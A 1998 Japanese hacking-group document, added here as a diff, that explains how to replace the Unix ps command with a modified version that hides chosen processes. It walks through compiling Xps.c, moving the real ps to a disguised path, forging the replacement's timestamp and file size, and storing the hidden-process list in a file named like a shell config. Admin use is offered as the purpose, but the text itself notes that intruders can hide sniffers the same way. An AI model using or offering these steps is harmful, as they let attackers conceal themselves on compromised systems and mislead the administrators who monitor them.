@@ -1,0 +1,48 @@
+                      ====================================
+                        The ShadowPenguin Documents No.6
+
+                                 - psの細工法 -
+                               Written by うにゅん
+                                  Oct.29, 1998
+                      ====================================
+
+1.はじめに
+
+tdm やsniffer なんかは、動いてるとpsすると発見することができます。しかしpsを改造
+されると出なくなってしまいますね。そうやって侵入者は長生きしますので、psして出て
+きた結果を鵜呑みにしないことです。また管理者の人もps改で監視デーモンの隠しに使え
+るかもしれません。
+
+2.用意しておくもの
+
+とりあえず、管理者用ってことで、logging_toolとcracker_basterっていうプログラム
+(仮)を隠す方法を書きます。同様に侵入者の人もsniffer とかtdm なんかも隠せてしまい
+ますね。要注意ですよ～。とりあえず、Xps.c とsizer 等（プログラムのサイズをごまか
+すツール）を用意しましょう。
+
+3.仕込み方
+
+  1.tmpかどっかで、Xps.cをコンパイルします。 
+    (例)
+    %cd /tmp %cc Xps.c -o ps 
+  2.オリジナルのpsの作成日時とサイズを確認 
+    (例)
+    %ls -al /usr/bin/ps -r-sr-xr-x 1 root sys 26372 7月 16日 1997年 /usr/bin/ps 
+  3.オリジナルのpsをどこかに移動します。 
+    (例)
+    #mv /usr/bin/ps /.cshrc_old 
+  4.Xpsをオリジナルpsのディレクトリにコピーします。 
+    #cp /tmp/ps /usr/bin 
+  5.日付とサイズを変更します。 
+    #touch 0716111197 /usr/bin/ps 
+    #sizer /usr/bin/ps 26372 
+  6.オリジナルのps、および消したいプロセス名リストを作成する
+    リストファイルはディフォルトで /.cshrc_bakです。 
+    (これを変更する場合は、Xps.cの #define CONFIG_FILEを変更して ください)
+    #cd / 
+    #cat > .cshrc_bak 
+    /.cshrc_old 
+    logging_tool
+    cracker_baster
+    ^D 
+    # 
